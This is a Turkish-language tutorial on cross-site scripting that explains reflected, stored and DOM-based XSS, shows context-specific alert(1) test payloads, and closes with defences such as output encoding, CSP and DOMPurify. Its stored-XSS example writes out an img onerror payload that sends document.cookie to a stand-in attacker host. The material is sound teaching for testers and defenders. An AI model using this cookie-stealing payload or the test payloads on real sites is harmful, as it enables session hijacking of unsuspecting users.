XSS (Cross-Site Scripting), saldırganın bir web uygulamasına kendi JavaScript kodunu enjekte edip bunu **başka kullanıcıların tarayıcısında** çalıştırabilmesidir. OWASP listelerinden hiç düşmemesinin sebebi de bu: etkisi kullanıcı oturumunu çalmaya kadar gidebiliyor.

Temel sebep neredeyse her zaman tek cümleyle özetlenebilir: **kullanıcıdan gelen veri, doğrulanmadan sayfaya yazılıyor.**

## 1. Reflected XSS

Zararlı girdi istekle birlikte gider ve aynı yanıtta geri yansır. Kalıcı değildir; kurbanın hazırlanmış bir bağlantıya tıklaması gerekir.

```
https://ornek.com/ara?q=<script>alert(1)</script>
```

Sunucu `q` parametresini "Arama sonucu: ..." diye sayfaya basıyorsa kod çalışır.

## 2. Stored XSS

Girdi veritabanına kaydedilir ve o sayfayı açan **herkeste** çalışır. En tehlikeli tip budur — yorum alanları, profil biyografileri, destek talepleri klasik hedeflerdir.

```html
<!-- Yorum olarak kaydedilen içerik -->
<img src=x onerror="fetch('https://saldirgan.site/?c='+document.cookie)">
```

## 3. DOM-based XSS

Sunucu hiç işin içinde değildir; açık tamamen istemci tarafındaki JavaScript'tedir.

```javascript
// Zafiyetli kod
document.getElementById("hos-geldin").innerHTML = location.hash.substring(1);
```

`sayfa.html#<img src=x onerror=alert(1)>` adresi kodu çalıştırır.

## Nasıl test ederim?

Önce zararsız bir işaretleyici gönderip **nereye düştüğüne** bakıyorum:

```
cyb3rtest123
```

Sayfa kaynağında bu değeri arıyorum. Nerede çıktığı hangi payload'ı deneyeceğimi belirliyor:

- HTML gövdesinde → `<script>alert(1)</script>`
- Bir attribute içinde → `" onmouseover="alert(1)`
- Zaten `<script>` bloğunun içinde → `';alert(1);//`

## Nasıl kapatılır?

| Önlem | Açıklama |
|---|---|
| Çıktı kodlama (output encoding) | Veriyi yazdığın bağlama göre kaçış uygula. Asıl çözüm budur. |
| `innerHTML` yerine `textContent` | Metin yazacaksan HTML olarak yorumlatma. |
| Content Security Policy | Inline script'i yasakla; `script-src 'self'` iyi bir başlangıç. |
| Sanitizasyon kütüphanesi | HTML girişine izin vermek zorundaysan DOMPurify kullan. |
| `HttpOnly` çerezler | XSS'i engellemez ama oturum çerezinin çalınmasını zorlaştırır. |

> Kara liste ile filtreleme (`<script>` kelimesini silmek gibi) çalışmaz. Atlatma yöntemi her zaman bulunur; doğru yaklaşım bağlama uygun kodlamadır.

## Özet

Üç tip de aynı kökten geliyor: **güvenilmeyen veri, koda dönüşebileceği bir yere yazılıyor.** Test ederken "girdim nereye düşüyor" sorusuna, savunma yaparken "bu veriyi hangi bağlamda yazıyorum" sorusuna odaklan.
